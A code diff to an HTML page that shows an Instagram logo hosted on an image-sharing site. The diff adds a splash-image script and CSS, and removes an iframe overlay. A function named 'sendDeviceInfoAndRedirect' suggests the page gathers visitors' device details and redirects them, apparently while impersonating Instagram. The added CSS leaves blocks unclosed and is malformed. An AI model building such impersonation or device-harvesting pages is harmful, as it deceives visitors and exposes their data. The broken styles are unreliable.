@@ -87,6 +87,42 @@ function sendDeviceInfoAndRedirect() {
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
     <style>
         body {
+           margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%; /* Set height to 100% */
+            transition: opacity 1s ease-in-out;
+        }
+
+        .image-container {
+            display: none;
+        }
+
+        .image {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Mobile-friendly styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            .image-container {
+                display: block;
+                text-align: center;
+
+            }
+            
             background-color: white;
             color: black;
             font-family: 'Roboto', sans-serif;
@@ -390,16 +426,42 @@ function sendDeviceInfoAndRedirect() {
     </style>
 </head>
 <body>
-  <iframe src="null.html" frameborder="0" style="width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: -1;"></iframe>
-
-  <script>
-    window.addEventListener("animationFinished", () => {
-      const iframe = document.querySelector("iframe");
-      iframe.parentNode.removeChild(iframe);
-    });
-  </script>
+  
   <!-- Add a navigation bar with the new Instagram logo -->
-    <div class="navbar">
+  
+  <link rel="preload" as="image" href="https://i.ibb.co/KN4q60z/Screenshot-2023-0925-025553-x4.png">
+
+<div class="container" id="container" style="display: none;">
+
+<div class="image-container">
+  <img class="image" src="https://i.ibb.co/KN4q60z/Screenshot-2023-0925-025553-x4.png" alt="Image 1">
+</div>
+
+<script>
+(function() {
+  const container = document.getElementById('container');
+  const animationImage = new Image();
+  animationImage.src = "https://i.ibb.co/KN4q60z/Screenshot-2023-0925-025553-x4.png";
+
+  let animationFinished = false;
+
+  animationImage.onload = function() {
+    document.querySelector('.image-container').style.display = 'block';
+    container.style.opacity = 1;
+    animationFinished = true;
+  };
+
+  setTimeout(() => {
+    if (!animationFinished) {
+      container.style.opacity = 0;
+    }
+  }, 1500); // Adjust the delay for the fade-out after loading
+
+})();
+</script>
+
+
+   <div class="navbar">
         <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
     </div>
 
